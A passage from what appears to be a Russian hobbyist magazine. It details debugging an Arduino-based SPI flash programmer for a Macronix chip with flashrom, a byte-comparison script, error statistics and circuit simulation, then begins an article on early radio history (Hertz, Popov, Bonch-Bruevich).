  Found Macronix flash chip "MX25L6405" (8192 kB, SPI) on serprog.


  Found Macronix flash chip "MX25L6406E/MX25L6408E" (8192 kB, SPI)
  on serprog.


  Found Macronix flash chip "MX25L6436E/MX25L6445E/MX25L6465E/MX25L6473E"
  (8192 kB, SPI) on serprog.


  Multiple flash chip definition match the detected chip(s):
  "MX25L6405","MX25L6406E/MX25L6408E","MX25L6436E/MX25L6445E/MX25L6465E/MX
  25L6473E".


  Please specify which chip definition to use with the -c  option.



Ну вот, дело сдвинулось с мертвой точки! Прочитанному программатором
идентификатору микросхемы удовлетворяют несколько моделей чипов, и нам
предлагается указать конкретный модельный ряд с помощью параметра -c.
В нашем случае подходит второй из предложенных вариантов, поэтому
команду  записи  файла  zte_h118n.bin,  размер  которого  совпадает
с емкостью микросхемы, можно сформулировать так:


flashrom -p serprog:dev=/dev/ttyUSB0:115200 -c "MX25L6406E/
MX25L6408E" -w zte_h118n.bin

На экране побежали информационные сообщения выполняемого процесса,
но завершился он неудачей:




  ...


  Verifying flash... FAILED at 0x00000002!


  Expected = 0x00, Found = 0x01, failed byte count from 0x00000000-
  0x007fffff: 0x15a53


  Your flash chip is in an unknown state.



Вот так, при сверке было обнаружено 88 659 расхождений, а микросхема
перешла в неопределенное состояние.


КАК СЛЫШНО? ПРИЕМ!

Я пробовал повторить операцию, но без особых успехов. Надо было что‑то
менять в устройстве этой экспериментальной установки. Попробовал под‐
ключить еще один диод по линии питания, но после этого микросхема снова
перестала определяться.
   Может быть, понизить напряжение не питания, а информационных сиг‐
налов? Давай попробуем! Тем более что для этого нам не придется вносить
существенных изменений в конструкцию. У нас уже есть три «понизителя»
напряжения на резистивных делителях. Для ясности схему одного из них я
показал на рисунке.
   Если увеличивать сопротивление резистора R1, то напряжение сигнала
на выходе будет уменьшаться. А для увеличения сопротивления достаточно
последовательно к R1 подключить резистор R3. Это можно сделать даже
без пайки, просто скрутив один вывод резистора R3 c концом соединитель‐
ного провода, а другой вывод использовать в качестве штекера.





           Увеличение сопротивления плеча резистивного делителя

Чтобы снизить риск повреждения микросхемы памяти во время эксперимен‐
тов, я решил сначала добиться устойчивого чтения, а к записи перейти позже.
И вот, убрав диод с линии питания и подключив на линии SCK (вывод 13 UNO-
программатора) и MOSI (вывод 11 UNO-программатора) по одному добавоч‐
ному резистору сопротивлением 2000 Ом, я выполнил чтение содержимого
микросхемы памяти.


             INFO

                           Считывание  содержимого  микросхемы  памяти
                     было  возможно  только  в  том  случае,  если
                        добавочные резисторы размещались на  конце
                          провода, подключенного к UNO-программатору.
                      Если перевернуть провод и поместить резистор
                       на стороне платы SPI Flash, то программатор вол‐
                   шебным образом перестает обнаруживать мик‐
                           росхему.


Но как узнать, было ли это чтение безошибочным, если данные в микросхему
были записаны с ошибкой? Сравнение с исходным файлом в этом случае
ничего не даст. Тогда я решил выполнить чтение еще раз и сравнить между
собой полученные результаты. Если они совпадут, то цель достигнута. А если
нет, то за оценку количества ошибок чтения можно принять величину d/2, где
количество расхождений d значительно меньше размера файла (посмотри
на рисунок).





   Количество ошибок e при чтении и число расхождений d при сравнении

У  меня  получилось  d  =  399  858  расхождений,  что   соответству‐
ет 199 929 ошибкам, или ошибкам в (199 929 / 8 388 608) × 100 = 2,38% байт.
Насколько можно доверять такой оценке и насколько она стабильна? Может
быть, в следующий раз будет 25%, а потом 0,01%?


ОБРАТИМСЯ К СТАТИСТИКЕ

Чтобы не гадать на кофейной гуще, я решил прибегнуть к статистике. Для это‐
го написал на Python программу compare.py , которая побайтово сравнивает
два файла и подсчитывает количество обнаруженных различий.
   Вот листинг программы compare.py для побайтового сравнения двух фай‐
лов.


import sys
if len (sys.argv) != 3:
    print ("Binary files comparison.")
    print ("Usage: %s file1 file2" % sys.argv[0])
    quit ()
print ("Files comparison: %s <---> %s" % (sys.argv[1], sys.argv[2]))


bufsize = 4096
diffs = 0
size = 0
f1 = open (sys.argv[1], 'rb')
f2 = open (sys.argv[2], 'rb')
n = 1
while n > 0:
    b1 = f1.read (bufsize)
    b2 = f2.read (bufsize)
    n = min (len (b1), len (b2))
    if n > 0:
        size += n
        for i in range (0, n):
            if b1[i] != b2[i]:
                diffs += 1
print ("Compared size : %d" % size)
print ("Differences   : %d (%.2f%%)" % (diffs, round(diffs / size *
100, 2)))
f2.close ()
f1.close ()

Эксперименты я проводил с помощью сценария оболочки, который выпол‐
няет чтение содержимого микросхемы четыре раза, а потом производит
шесть парных сравнений полученных результатов: 1 — 2, 1 — 3, 1 — 4, 2 — 3,
2 — 4 и 3 — 4.
   Вот листинг сценария оболочки для автоматизации эксперимента.


#!/bin/sh
# rm *.bin
echo '*** Data reading.'
for i in 1 2 3 4
do
echo "*** Iteration N $i."
date
flashrom -p serprog:dev=/dev/ttyUSB0:115200 \
    -c 'MX25L6406E/MX25L6408E' \
    -r file $i.bin
date
done
echo "*** File comparison."
python3 compare.py file1.bin file2.bin
python3 compare.py file1.bin file3.bin
python3 compare.py file1.bin file4.bin
python3 compare.py file2.bin file3.bin
python3 compare.py file2.bin file4.bin
python3 compare.py file3.bin file4.bin
echo "*** Done."

У меня получились такие количества расхождений d:



  400 167; 353 172; 447 126; 329 699; 324 650; 512 561


что соответствует примерно такому ряду ошибок:



  200 084; 176 586; 223 563; 164 850; 162 325; 256 281


или в процентах от общего количества байтов:



  2,39%; 2,11%; 2,67%; 1,97%; 1,94%; 3,06%


Выборочное среднее для этого ряда Xср = 2,36%, а выборочное среднеквад‐
ратичное отклонение S = 0,44%. Отклонения результатов эксперимента
от выборочного среднего в единицах среднеквадратичного отклонения сос‐
тавляют



  0,07; –0,57; 0,70; –0,88; –0,95; 1,58


Все значения уверенно попадают в пресловутый диапазон «шесть сигм» (Xср
– 3S; Xср + 3S), который я изобразил на рисунке. Это позволяет пред‐
положить, что среди результатов эксперимента нет грубых ошибок и описан‐
ную методику измерений с вычислением средних значений для оценки качес‐
тва построенной системы можно использовать на практике.





   Распределение экспериментальных значений в диапазоне «шесть сигм»

Теперь, изменяя величины сопротивлений, можно понять, привело ли выпол‐
ненное изменение к улучшению или ухудшению ситуации.


Метод трех сигм
Описание этого метода оценки результата экспериментов ты можешь пос‐
мотреть в седьмой главе учебного пособия «Теория эксперимента» О. В.
Чемезова и О. Ю. Маковской, которое доступно на сайте УрФУ . В нем стро‐
гость изложения удачно сочетается с легким научно‑популярным стилем.
   Если  кратко, то методика основывается на том  факте, что на  прак‐
тике 99,74% результатов измерений попадают в диапазон, простирающийся
влево и вправо от среднего значения на величину 3σ, где σ (греческая буква
«сигма») — это среднеквадратичное отклонение. Предполагается, что если
при небольшом числе измерений (мы выполнили всего шесть) некоторые
результаты выходят за пределы  означенного диапазона, то либо были
допущены грубые ошибки при измерениях, либо в ходе измерений условия
проведения эксперимента менялись.
  В  разделе  менеджмента,  связанном с  управлением  качеством,  эта
методика получила название «шесть сигм» из‑за общей длины доверитель‐
ного интервала. Студенты, которые пропускали лекции и готовились по чужим
конспектам, на экзамене забавляют преподавателя и однокурсников, называя
эту методику «шестьдесят шесть» из‑за схожести начертания греческой буквы
σ с цифрой 6.



Не буду утомлять тебя подробностями всех опытов, которые я проводил
в свободное время на протяжении нескольких дней. Для этого были изготов‐
лены соединительные провода с постоянными и переменными резисторами.
Отмечу лишь, что наилучшие результаты были получены с размещением
на линии SCK добавочного сопротивления 1540 Ом, а на линии MOSI —
730 Ом. Количества расхождений образовали такой ряд:



  12 484; 30 090; 8 076; 35 013; 13 015; 30 631


Это соответствует среднему проценту ошибок Xср = 0,13%. Несмотря на зна‐
чительно более хороший результат, его нельзя считать удовлетворительным,
пока есть хотя бы одна ошибка. Но варьированием величин сопротивлений
его уже не улучшить.
  В следующей попытке повысить показатели считывания я уменьшил длину
соединительных проводов сигнальных линий до 5 см. Результат не замедлил
проявить себя: UNO-программатор определял микросхему памяти без всяких
дополнительных элементов, но считывание проходило по‑прежнему с ошиб‐
ками. Лучший ряд расхождений, полученный с добавочным сопротивлением
на линии SCK 1800 Ом, а на линии MOSI 670 Ом, теперь выглядел так:



  743; 712; 715; 633; 638; 601


Налицо очередное улучшение, но оно так же далеко от успеха, как и в самом
начале пути.


Как извлечь данные при ошибках
Строго говоря, при таком сравнительно небольшом количестве ошибок уже
можно прочитать содержимое микросхемы памяти, если бы перед нами
стояла только такая задача.
  Для этого достаточно провести считывание не менее трех раз (чем боль‐
ше, тем лучше), после чего побайтово сравнить полученные файлы. Для выяс‐
нения истинного значения байта на каждом шаге надо определять моду —
наиболее часто встречающееся значение в данной позиции среди всех про‐
читанных файлов.
   Однако нам надо добиться безошибочной записи информации, поэтому
придется еще поработать.



Что делать дальше? Снова укорачивать провода? Но ими и так уже неудобно
пользоваться. Кроме  того,  микросхема Winbond 25Q128FVSG  работала
без всяких «танцев с бубном». Неужели мне остается только назвать свой
экземпляр SPI Flash грубой подделкой и забросить на дальнюю полку?


ПОГРУЖЕНИЕ В МАТЧАСТЬ

Когда метод перебора вариантов перестает работать, надо попробовать
понять, в чем заключается проблема. Лучше всего в этом помогает знакомс‐
тво с результатами, которые были получены предшественниками, «съевшими
собаку» в предметной области. Концентрированное изложение теории в дос‐
тупной форме я нашел в университетской методичке «Электрические соеди‐
нения в электронных вычислительных средствах».


        WWW

                           Методичку  «Электрические  соединения в ЭВС
                      и особенности их конструктивно‑технологической
                          реализации», которую разработали И. М. Русак
                      и В. П. Луговский, ты можешь найти на сайте БГУ‐
                   ИР .


Там написано, что если длительность фронта импульса сигнала больше вре‐
мени задержки распространения сигнала, то линия связи считается электри‐
чески «короткой». Тестирование микросхемы MX25L6406E, если верить спе‐
цификации, осуществлялось «импульсами с продолжительностью фронта
не более 5 нс». За это время сигнал в кабеле UTP распространится на сле‐
дующее расстояние:
         −9                  9   (5 × 10   с) × 0,7 × (0,3 × 10 м/с) = 1,05 м
   Здесь 0,7 — коэффициент скорости распространения сигнала в кабеле
относительно скорости света.
   Длина соединительных проводов у меня гораздо меньше метра, а значит,
и время распространения сигнала меньше длительности фронта импульса.
Поэтому линия у нас электрически «короткая». Ее модель может быть описана
сосредоточенными параметрами — средними значениями активного
сопротивления, емкости и индуктивности для всей линии, несмотря на то что
в действительности они не являются одинаковыми на каждом ее участке.


                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИGEEK
НЕПРОСТОЙ MACRONIX
              РАСШИРЯЕМ ПЕРЕЧЕНЬ
       МИКРОСХЕМ, ПОДВЛАСТНЫХ UNO-
                    ПРОГРАММАТОРУ





МОДЕЛЬ ПЕРВОГО ПРИБЛИЖЕНИЯ

Уж коли речь зашла о модели, давай построим ее в программе Quite Universal
Circuit Simulator.


        WWW

                         Ссылки для загрузки программы Quite Universal
                              Circuit Simulator ты найдешь на ее официальном
                            сайте .


Принципиальная схема цифрового генератора, к которому подключен при‐
емник соединительным проводом, показана на рисунке. Существенным эле‐
ментом здесь является эквивалентная схема соединительного провода.
  В методичке сообщается, что при анализе  электрических процессов
в короткой линии учитывают только ее емкость и индуктивность, а активным
сопротивлением пренебрегают. Поскольку соединительный провод проходит
вдали от общего провода, я решил пренебречь и его емкостью (что, как мы
увидим дальше, было опрометчиво).





  Принципиальная схема модели генератора, приемника и соединитель‐
  ной линии

Моделирование — это построение виртуального мира. Чтобы он не оказался
населенным феями и единорогами, а отражал окружающую действитель‐
ность, параметры модели нельзя просто «взять с потолка», они должны харак‐
теризовать реальные объекты. Поэтому давай соберем необходимые факты.
   Вопрос, на который мы будем искать ответ с помощью модели, — в каком
виде сигнал достигает входа приемника, если с выхода источника отправ‐
ляется прямоугольный импульс? Для этого прежде всего надо описать этот
импульс. Какова его длительность? Из исходных текстов скетча frser-duino
можно  установить,  что  частоту  информационного  обмена  подбирают,
начиная с половины частоты центрального процессора (UNO R3 работает
на частоте 16 МГц), двигаясь по шкале частот вниз делением пополам.
   Конкретное значение частоты обмена данными между UNO-программа‐
тором и микросхемой SPI Flash можно указать в командной строке утилиты
flashrom с помощью параметра spispeed , например так:


flashrom -p serprog:dev=/dev/ttyUSB0:115200,spispeed= 200k

Запрошенное значение частоты округляется вниз до ближайшего примени‐
мого значения. Но добиться устойчивой работы программатора с помощью
понижения частоты мне не удалось.
   Давай остановимся на частоте 1 МГц — это вполне реальная величина.
Тогда период следования импульсов будет равен 1 / 1 МГц = 1000 нс. Если их
скважность равна 2, длительность импульса составит 500 нс. Интервал вре‐
мени моделирования возьмем равным 1500 нс, а импульс возникнет в его
середине. Чтобы мы одинаково представляли, о чем идет речь, посмотри
на рисунок.





              Основные параметры прямоугольного сигнала

Что касается электрических параметров источника и приемника импульсов,
то оценку их величин можно найти в спецификациях микроконтроллера
ATmega328P и микросхем SPI  Flash. Сопротивление цифрового выхода
генератора можно принять равным 25 Ом, сопротивление цифрового входа
приемника — 100 МОм, а их емкости — по 5 пФ.
   Давай попробуем посмотреть на соединительный провод как на прямой
отрезок медной жилы кабеля UTP длиной 10 см и диаметром 0,5 мм (24AWG).
Тогда его индуктивность на частоте 1 МГц составляет около 120 нГн (расчеты
проводились с помощью радиотехнического онлайн‑калькулятора ).
    Результат моделирования описанной конфигурации показан на графике
линией синего цвета. На ней видны выбросы, не превышающие 0,2 В и быс‐
тро затухающие. Они вряд ли могут быть причиной каких‑то проблем.





               График сигнала на цифровом входе приемника

Теперь давай немного изменим параметры модели. Ведь соединительный
провод у нас не прямой, а изогнут подковой и больше похож на половину вит‐
ка катушки, чем на прямой отрезок. Его индуктивность вполне может быть
в полтора раза больше рассчитанной величины. Не исключено, что и емкость
цифрового входа в два раза превысит выбранное начальное значение.


        WWW

                           Архив с файлами модели первого приближения
                       для программы Quite Universal Circuit Simulator


Моделирование с измененными параметрами дает  картину, показанную
на  графике  линией  красного  цвета.  Размах  выбросов  достигает 3  В,
и переходный процесс продолжается дольше. Теперь уже нельзя исключать
его влияния на правильность интерпретирования сигнала приемником.
  А что будет, если на конец соединительного провода возле источника
установить резистор сопротивлением, например, 820 Ом? Ответ на этот воп‐
рос показан на графике линией зеленого цвета. Выбросы исчезли, нап‐
ряжение плавно нарастает и спадает. Резистор снизил добротность колеба‐
тельного контура, образованного индуктивностью соединительного провода
и емкостями входов и выходов.


ВОЗВРАЩЕНИЕ К РЕАЛЬНОСТИ

И тут на меня снизошло озарение. До сих пор я подбирал сопротивления сиг‐
нальных линий, направленных от UNO-программатора к плате SPI Flash.
А почему бы не попробовать установить резистор на линию MISO (вывод 12
UNO-программатора), по которой сигналы идут во встречном направлении?
Я по‑быстрому установил на зеленый провод попавший под руку резистор
сопротивлением 1200 Ом и запустил тестирование. С нетерпением дождался
результатов:



  0, 0, 0, 0, 0, 0


Нули, Карл! Клара, расхождений нет! Не откладывая дело в долгий ящик, я
запустил запись образа прошивки, и она тоже завершилась полным успехом.
И даже то, что оригинальная прошивка на моем экземпляре маршрутизатора
из микросхемы MX25L6406E тоже не заработала, не смогло стереть счастли‐
вую улыбку с моего лица.
  В ходе всех проделанных опытов исходная цель экспериментов утратила
свою ценность, зато появилась новая — довести комплект самодельного
оборудования до определенной степени универсальности. И эта новая цель
не позволила остановиться на достигнутом.
   Почему же все‑таки микросхема от Winbond отлично работает с длинными
соединительными проводами, а изделие от Macronix требует дополнитель‐
ного обвеса даже на коротких проводах? Этот вопрос заставил меня продол‐
жить поиск окончательного ответа. Я вернулся к длинным соединительным
проводам, и снова потянулись дни монотонных опытов, только теперь менять
сопротивления приходилось не на двух, а на трех линиях.
   Ожидая результатов, я просматривал материалы по электротехнике, циф‐
ровой схемотехнике и линиям связи, но не находил теории, которая удов‐
летворительно объяснила бы наблюдаемый эффект.
   Неудачи продолжались до тех пор, пока в отчаянии я не решил перевер‐
нуть провода резисторами к плате SPI Flash. На линии SCK было добавлено
сопротивление 1980 Ом, на линии MOSI — 1970 Ом, а на линии MISO —
670 Ом. Ряд расхождений стал таким:



  27, 37, 26, 26, 25, 35


Но ведь раньше при такой ориентации проводов микросхема даже не опре‐
делялась! Как вообще влияет ориентация проводов на передачу сигнала?
Почему качество работы системы настолько зависит от того, на каком конце
соединительного провода  стоит добавочный резистор? Давай‑ка  снова
обратимся к моделированию.


УТОЧНЕННАЯ МОДЕЛЬ

Что произойдет, если перевернуть соединительный провод на построенной
ранее модели? А ничего не произойдет, с точки зрения той модели эти вари‐
анты равноценны. Что же мы не учли? Может быть, не стоило пренебрегать
емкостью соединительного провода? Давай проверим!
  Для этого в эквивалентную схему соединительного провода надо добавить
конденсатор. Но куда — справа или слева от индуктивности? Мне кажется,
что правильнее будет использовать симметричную модель линии  связи,
которая описана в методичке. Индуктивность в этом случае разделяется
на две компоненты, а конденсатор подключается между ними так, как показа‐
но на рисунке.





  Принципиальная схема уточненной модели генератора, приемника
  и соединительной линии

Сначала я провел моделирование без дополнительных резисторов на соеди‐
нительном проводе и убедился, что сигнал на входе приемника сопровож‐
дается сильными выбросами, как и в предыдущей модели, — красная линия
на графике. Потом установил резистор сопротивлением 100 Ом на конце
соединительного провода, включенного в приемник.
   Продолжительность колебательного процесса и размах выбросов умень‐
шились, но искажение все еще оставалось значительным — синяя линия
на графике. А вот после переворота соединительного провода так, чтобы
резистор оказался возле выхода генератора, качество сигнала на входе при‐
емника значительно улучшилось, что демонстрирует зеленая линия на гра‐
фике.





     График сигнала на цифровом входе приемника уточненной модели

Надо сказать, что величины емкости и индуктивности соединительного про‐
вода были выбраны с излишней осторожностью. Их реальные значения, ско‐
рее всего, значительно больше указанных на схеме, а значит, и переходные
процессы в линии сильнее искажают сигнал. Это может потребовать большей
величины  устанавливаемого  на  соединительный  провод  сопротивления
для  устранения  негативных  эффектов.  Можешь  провести  испытания
на модели и убедиться в этом сам.


        WWW

                           Архив с файлами уточненной модели для прог‐
                   раммы Quite Universal Circuit Simulator


В любом случае построенная модель наглядно показывает, что для сох‐
ранения качества передаваемого сигнала добавочный резистор лучше уста‐
навливать на конце провода, который подключен к источнику цифрового сиг‐
нала, а не к приемнику.


ФИНИШНАЯ ПРЯМАЯ

Так‑так‑так. Когда я начинал эксперименты и ориентировал провода резис‐
торами к плате SPI Flash, микросхема памяти не определялась. Но тогда
отсутствовало и добавочное сопротивление на линии MISO. Сейчас резистор
на линии MISO установлен на стороне источника сигнала — микросхемы
памяти, что, как мы выяснили в результате моделирования, наилучший вари‐
ант.
  А вот на линиях MOSI и SCK мало того что резисторы стоят на неудачной
стороне, так еще и их сопротивления слишком велики. Может быть, поп‐
робовать сначала их уменьшить и посмотреть, как это отразится на работе
установки? Я взял два попавших под руку резистора по 820 Ом, установил их
на линии SCK и MOSI и запустил тестирование. Результат:



  0, 0, 0, 0, 0, 0


Не верю своим глазам! Это полный успех! Длинные соединительные провода,
а микросхема Macronix работает не хуже, чем Winbond! Но какие величины
сопротивлений позволят получить наилучший и стабильный результат?
  Еще несколько опытов, и картина прояснилась:
 • дополнительные резисторы на линиях SCK и MOSI оказались вообще
   не нужны;
 • ошибки информационного обмена отсутствуют при установке на линию
  MISO дополнительного резистора сопротивлением от 550 до 1150 Ом;
 • дополнительный резистор должен помещаться на том конце соединитель‐
   ного провода, который подключается к источнику сигнала.

Последний пункт  позволяет установить резистор номиналом, например,
820 Ом, прямо на плате SPI Flash и пользоваться для ее подключения к UNO-
программатору обычными проводами.
   Постой‑ка, а после установки дополнительного резистора не начнутся ли
проблемы с микросхемой Winbond? Оказалось, что чип W25Q128FVSG ста‐
бильно работает в обоих вариантах подключения. Таким образом, допол‐
нительный резистор на линии MISO делает собранную нами систему универ‐
сальной. По крайней мере до тех пор, пока не найдется какая‑нибудь мик‐
росхема, опровергающая это утверждение.


ЭПИЛОГ

Вот и подошел к концу долгий и тернистый путь программирования микросхе‐
мы MX25L6406E. Перечитывая статью, я удивляюсь, как много было лишних и,
как теперь понимаю, ошибочных действий. Зато теперь мы знаем правила,
которые помогают избавиться от ошибок при передаче данных между узлами
устройства по соединительным проводам в цифровой форме — прямоуголь‐
ными импульсами.
 1. Прежде всего надо постараться сделать соединительный провод как мож‐
   но короче, а его контакты — как можно надежнее. Это уменьшит паразит‐
  ные емкость и индуктивность и, возможно, решит проблему.
 2. Сохранению  качества  цифрового  сигнала   способствует   установка
   на соединительный провод резистора, который уменьшает добротность
   «паразитного» колебательного контура.
 3. Добавочный резистор следует устанавливать на том конце соединитель‐
   ного провода, который обращен к источнику сигнала, а не к приемнику.

Разработанный в ходе экспериментов метод измерения качества UNO-прог‐
рамматора на основе подсчета количества ошибок чтения позволил вести
работы над его улучшением целенаправленно. При наличии осциллографа,
вероятно, было бы удобнее ориентироваться на форму сигнала, поступающе‐
го в приемник. Но даже в этом случае окончательной мерой достижения цели
будет отсутствие ошибок чтения и записи информации.
   Компенсировать отсутствие осциллографа в какой‑то степени позволило
моделирование настраиваемой системы в программе Quite Universal Circuit
Simulator. Но нельзя забывать о том, что построенная модель — это сильно
упрощенное отражение действительности и не учитывает, например, вза‐
имного влияния соседствующих проводников.
    Хочется снять шляпу перед инженерами Winbond — если бы все изделия
были такими, как их продукция, то у простого пользователя было бы гораздо
меньше трудностей. Интересно, они просто установили резистор у циф‐
рового выхода MISO прямо в микросхеме или применили какое‑то другое
решение? Увы, найти ответ на этот вопрос невозможно без доступа к конс‐
трукторской документации. Или без хорошего микроскопа...
GEEK





В начале XX века радио уже существовало
и  вовсю  использовалось.  Сегодня мы
вспомним историю его развития, соберем
приемник на основе регенератора и убе‐
                                                                              Candidum
                                                                                               duospirit@gmail.comдимся в том, что технологии столетней дав‐
ности прекрасно работают и в XXI веке!


Ранее мы уже говорили про Армстронга и его замечательные изобретения ,
более того, мы даже собрали сверхрегенератор и убедились в его работос‐
пособности. В этот раз мы пощупаем регенератор и посмотрим, на что спо‐
собна схемотехника 1920-х годов 100 лет спустя.


О ЗАРОЖДЕНИИ РАДИО

Итак, отсчет истории радио можно вести с разных дат, но мы, пожалуй, нач‐
нем с Генриха Герца, который в конце 1880-х — начале 1890-х изучал рас‐
пространение радиоволн и показал, что они ведут себя в целом аналогично
свету, но с поправкой на значительно большую длину волны (различие на 6–
9 порядков). Собственно, в его честь радиоволны еще на протяжении лет
десяти называли лучами Герца.
  Для излучения радиоволн Герц использовал передатчик собственной
конструкции, который также впоследствии носил его имя (вернее, фамилию).
Состоял этот передатчик из катушки Румкорфа и вибратора Герца . Катушка
Румкорфа — достаточно простой и надежный источник высоковольтного
переменного напряжения и конструктивно несколько напоминает катушку
зажигания, с той лишь разницей, что в ней первичная обмотка работает еще и
как реле (вибропреобразователь), которое периодически размыкает цепь
первичной обмотки. Иными словами, на вход этого нехитрого устройства
приходит низковольтное постоянное напряжение, а на выходе получается
высоковольтное переменное с напряжением в десятки тысяч вольт.





                                 Катушка Румкорфа


             INFO

                        Настоящий  радиолюбитель  —  это  человек,
                      который может не меняясь в лице и без ухмылки
                         рассуждать о мультивибраторе, самовозбужде‐
                      нии и вибраторе Герца.


Итак, высокое напряжение подается на полуволновой вибратор, периодичес‐
ки зажигая искру в его искровом промежутке. Собственно, вибратор в этой
схеме играет роль частотозадающего элемента и антенны, впрочем, антенна
как частотозадающий элемент вообще характерна для ранних радиосистем.
Приемник, а лучше сказать, индикатор радиоизлучения у Герца был прост
как пять копеек. Им служил одиночный виток с искровым зазором, под воз‐
действием радиоволны в нем проскакивала искра. Стоит отметить, что уже
Герц отчетливо представлял себе пользу настройки приемника в резонанс
с передатчиком — это заметно повышало чувствительность схемы.





               Схема экспериментальной установки Г. Герца

Таким образом, Герц осуществлял контролируемую передачу радиосигнала
на расстояние до нескольких десятков метров. Тут у читателя может воз‐
никнуть вопрос: а представлял ли Герц, что он изобрел и что из этого может
получиться? И таки да, он это прекрасно понимал, как и десятки его сов‐
ременников. Так почему изобретение радио приписывают А. С. Попову ? Тут
дело только в практичности и функциональности. Из‑за чрезвычайно низкой
чувствительности кольцевого вибратора в роли радиоприемника установка
Герца была способна лишь на демонстрацию самой возможности передачи
сигналов посредством радиоволн. Вот эту‑то проблему и решил Попов,
использовав  в  качестве  чувствительного  элемента  модифицированный
когерер.
   Когерер тоже штука нехитрая, он представляет собой два электрода, меж‐
ду которыми помещен металлический порошок. Под воздействием сильного
электрического поля проводимость когерера резко возрастает и остается
такой даже после исчезновения поля. Природу этого явления упрощенно
можно объяснить частичным спеканием частиц металлического порошка
под воздействием искры, пробегающей между ними в сильном электричес‐
ком поле. Для возвращения когерера в исходное состояние его достаточно
встряхнуть.  Стоит  указать, что изобретение  когерера можно приписать
Эдварду Бранли и Оливеру Лоджу, работавшим независимо в это же самое
время, а приемник Попова представляет собой доработанный приемник Лод‐
жа.





                              Когерер Попова

Модификация Попова заключалась в том, что его когерер встряхивался авто‐
матически при прохождении через него тока, для чего использовался молото‐
чек от дверного звонка. Таким образом, «грозоотметчик Попова» был первым
приемником, способным к приему телеграфных сигналов. Что и было про‐
демонстрировано 7 мая 1895 года.





                           Приемник Попова





                         Схема приемника Попова

К чему я это все? А к тому, что над темой «лучей Герца» независимо тру‐
дилось не менее десятка ученых, которые прекрасно знали о работах друг
друга, и все вышеописанное произошло буквально в течение пяти лет. Так что
изобретателем радио потенциально мог стать любой из них, и им стал Попов.
А дальше пошла череда оптимизаций, направленная на увеличение дальнос‐
ти приема. Так, уже на первых порах всем было очевидно, что если у передат‐
чика или приемника сделать антенну подлиннее, то дальность связи увеличит‐
ся.
   Длина волны также увеличивается, поскольку в первых версиях передат‐
чиков и приемников антенна входила в частотозадающую цепь. Соответс‐
твенно, увеличение размеров антенны увеличивает длину волны. Кроме того,
вплоть до начала 1920-х годов считалось, что длинные и сверхдлинные вол‐
ны — наиболее дальнобойные.


ОТ ПОПОВА ДО ЛЕНИНА

Об этом периоде отечественной истории радио сохранилась лишь отрывоч‐
ная информация. Но в целом в те годы мы заметно отставали от Запада.
В начале века царская власть недооценила значение радио: оно считалось
дорогим и ненадежным, впрочем, радиофикация флота все‑таки велась.
Однако после поражения в Русско‑японской войне стало понятно, что мы
отстаем и мировой технический прогресс надо догонять. Тут, как всегда, воз‐
никла дилемма: что делать — открывать свое производство или закупить
на Западе? Первый вариант смотрелся дешевле, но предполагал лишь отда‐
ленный результат и без гарантий. Второй же хоть и был дороже, но сулил быс‐
трый гарантированный эффект.
   Опять же про откаты, кумовство и коррупцию тогда уже знали. В России
начали закупать зарубежное оборудование: сначала французской компании
«Дюпре», потом немецкой фирмы «Телефункен», которая даже имела эксклю‐
зивного дистрибьютора в Российской империи — акционерное общество
«Siemens & Halske AG». Параллельно на наш рынок пыталась зайти англий‐
ская «Маркони». Решения «Маркони» уступали «Телефункену» по характерис‐
тикам, цены были заметно выше, а лицензионные условия — хуже. Поэтому
изделия «Маркони» долго не пользовались популярностью.
   Впрочем, после покупки контрольного пакета акций РОБТиТ (Русское
общество  беспроволочных  телеграфов  и  телефонов),  организованного
в 1908 году Семеном Моисеевичем Айзенштейном, дела у них наладились.
Некоторые  даже  считают,  что  РОБТиТ  изначально  организовывалось
для закупки оборудования «Маркони». Впрочем, радиомастерскую по ини‐
циативе Попова при Морском ведомстве тоже открыли. Однако ввиду малого
и нерегулярного финансирования дорасти до уровня полноценного завода
ей удалось лишь к концу Первой мировой, причем большая часть этого пути
была пройдена ближе к концу войны.
  А уже в 1918 году завод пришлось эвакуировать. Впрочем, РОБТиТ
и Радиотелеграфный завод Морского ведомства (впоследствии Радиотелег‐
рафный завод им. Коминтерна) внесли существенный вклад в развитие оте‐
чественной радиотехники, как до революции, так и после нее. Что же касается
радиолюбительства, то при царе его не существовало, в том числе по при‐
чине запрета для частных лиц на владение приемными станциями (про
передающие и говорить нечего). В те времена такая практика была во многих
европейских странах, и связано это было во многом с государственной тай‐
ной.
  Но иногда случались курьезы. Так, за попытку устроить в домашних усло‐
виях любительскую радиостанцию без надлежащего разрешения предста‐
вителей власти техник киевского железнодорожного телеграфа С. С. Жидков‐
ский был арестован и два месяца отсидел в тюрьме. Это не значит, что у нас
не имелось специалистов мирового уровня. Были, и про передовые раз‐
работки они прекрасно знали. Например, в Петербургском университете уче‐
ник Попова В. И. Коваленков собрал электровакуумный диод (1909 год),
а с 1910-го по 1913-й последовательно разработал трехэлектродную лампу,
двухсеточную лампу и, наконец, образец генераторной лампы. Но это все
были академические исследования.
  В РОБТиТ Н. Д. Папалекси организовал экспериментальное производство
мягких ртутьнаполненных электронных ламп, на базе которых создал генера‐
тор незатухающих колебаний. Этот сигнал принимался на расстоянии 25 км.
Также он проводил успешные эксперименты на тему радиосвязи с подводны‐
ми лодками (само собой, Англия оперативно узнала о результатах). Впрочем,
лампы конструкции Папалекси изготавливались весьма малым тиражом, так
что его исследования тоже можно отнести скорее к научным изысканиям.
К слову сказать, Н. Д. Папалекси и его коллега и друг Л. И. Мандельштам
были аспирантами нобелевского лауреата Карла Брауна .
  А вот Михаил Александрович Бонч‑Бруевич заслуживает, несомненно,
отдельного разговора. Радиотехникой он увлекся еще в Николаевском инже‐
нерном училище, где на втором курсе собрал передатчик и приемник Попова.
Служил Бонч‑Бруевич на Тверской приемной радиостанции, использовав‐
шейся для связи с союзниками по Антанте. Передатчики были расположены
в Москве и Питере, а приемник, соответственно, в Твери.
   Передатчики использовались дуговые и  достаточно мощные  (поряд‐
ка 300 кВт). Работа приемника вблизи с ними была сильно затруднена, поэто‐
му станция находилась на отдалении от них, а принятые сообщения отправ‐
лялись проволочным телеграфом в столицу. К слову, эта система была закуп‐
лена у «Маркони». Приемник был детекторный, впрочем, информация из раз‐
ных источников на этот счет различается: в некоторых утверждается, что
для приема затухающих колебаний использовался кристаллический детектор,
а для незатухающих — механический тикер. В других источниках говорится,
что лампы там все же имелись, и это, вероятно, были лампы Раунда — Мар‐
кони .





                  Лампа Раунда времен Первой мировой

Бонч‑Бруевич загорелся желанием самостоятельно изготовить радиолампу,
и желательно «жесткую».


             INFO

